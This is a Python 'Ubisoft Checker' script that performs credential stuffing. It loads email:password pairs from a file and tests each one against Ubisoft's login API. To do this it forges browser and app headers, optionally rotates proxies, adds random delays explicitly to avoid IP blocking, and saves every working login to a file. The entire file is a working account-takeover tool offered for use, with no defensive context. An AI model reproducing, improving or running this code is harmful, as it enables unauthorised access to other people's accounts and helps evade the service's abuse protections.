import requests
import base64
import json
import time
import random
import os
import sys
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

# D-TECH Banner
def banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
╔═════════════════════════════════════════╗
║          🛡️ D-TECH Ubisoft Checker 🛡️       ║
║            Made by Preasx24             ║
╚═════════════════════════════════════════╝
{Style.RESET_ALL}""")


# User Input for File Paths with Validation
def get_file_path(prompt, must_exist=True):
    while True:
        path = input(f"{Fore.YELLOW}📂 {prompt}: {Style.RESET_ALL}").strip()
        if must_exist and not os.path.exists(path):
            print(f"{Fore.RED}❌ [ERROR] File not found. Please try again.{Style.RESET_ALL}")
        elif not must_exist:
            return path
        else:
            return path


# Load accounts from a file (Limit to first 20)
def load_accounts(file_path):
    try:
        with open(file_path, 'r') as file:
            accounts = [line.strip().split(':') for line in file if ':' in line]
        if not accounts:
            print(f"{Fore.YELLOW}⚠️ [WARNING] No valid accounts found in the file.{Style.RESET_ALL}")
            sys.exit()
        limited_accounts = accounts[:20]  # Limit to the first 20 accounts
        print(f"{Fore.BLUE}🔄 [INFO] Loaded {len(limited_accounts)} accounts (Limited to 20).{Style.RESET_ALL}")
        return limited_accounts
    except FileNotFoundError:
        print(f"{Fore.RED}❌ [ERROR] Accounts file not found.{Style.RESET_ALL}")
        sys.exit()


# Save successful accounts
def save_success(success_file, email, password):
    try:
        with open(success_file, 'a') as file:
            file.write(f"{email}:{password}\n")
        print(f"{Fore.GREEN}✅ [SAVED] {email}:{password} saved to {success_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ [ERROR] Could not save account: {e}{Style.RESET_ALL}")


# Display Progress Bar
def progress_bar(current, total, bar_length=40):
    percentage = current / total
    arrow = f"{Fore.GREEN}█{Style.RESET_ALL}" * int(round(percentage * bar_length))
    spaces = ' ' * (bar_length - len(arrow))
    sys.stdout.write(f"\r[{arrow}{spaces}] {int(percentage * 100)}%")
    sys.stdout.flush()


# Check Ubisoft Account
def check_account(email, password, success_file):
    credentials = f"{email}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode()).decode()
    data = {"rememberMe": True}
    headers = HEADERS.copy()
    headers["Authorization"] = f"Basic {encoded_credentials}"
    
    proxy = random.choice(PROXIES) if PROXIES else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    try:
        response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(data), proxies=proxies)
        if response.status_code == 200 and "platformType" in response.text:
            print(f"\n{Fore.GREEN}✅ [SUCCESS] {email}:{password} - Valid Account{Style.RESET_ALL}")
            save_success(success_file, email, password)
        elif "Invalid credentials" in response.text:
            print(f"\n{Fore.RED}❌ [INVALID] {email}:{password} - Invalid credentials{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️ [ERROR] {email}:{password} - Unexpected response{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}❌ [ERROR] Network issue: {e}{Style.RESET_ALL}")


# Main Execution
def main():
    banner()
    
    # User-Specified File Paths
    accounts_file = get_file_path("Enter the path to your accounts file")
    success_file = get_file_path("Enter the path to save valid accounts", must_exist=False)
    
    accounts = load_accounts(accounts_file)
    total_accounts = len(accounts)
    
    print(f"\n{Fore.BLUE}🔄 [INFO] Starting to check {total_accounts} accounts...\n{Style.RESET_ALL}")
    
    for index, (email, password) in enumerate(accounts, start=1):
        print(f"{Fore.CYAN}🛠️ [{index}/{total_accounts}] Checking {email}...{Style.RESET_ALL}")
        progress_bar(index, total_accounts)
        check_account(email, password, success_file)
        
        # Prevent IP blocking with delay
        time.sleep(random.uniform(1.5, 4))
    
    print(f"\n{Fore.GREEN}🎯 [COMPLETED] Checked {total_accounts} accounts (Limited to 20).{Style.RESET_ALL}")


# Settings
HEADERS = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "GenomeId": "85c31714-0941-4876-a18d-2c7e9dce8d40",
    "Host": "public-ubiservices.ubi.com",
    "Origin": "https://connect.ubisoft.com",
    "Referer": "https://connect.ubisoft.com/",
    "Ubi-AppId": "314d4fef-e568-454a-ae06-43e3bece12a6",
    "Ubi-RequestedPlatformType": "uplay",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}
LOGIN_URL = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
PROXIES = []

if __name__ == "__main__":
    main()
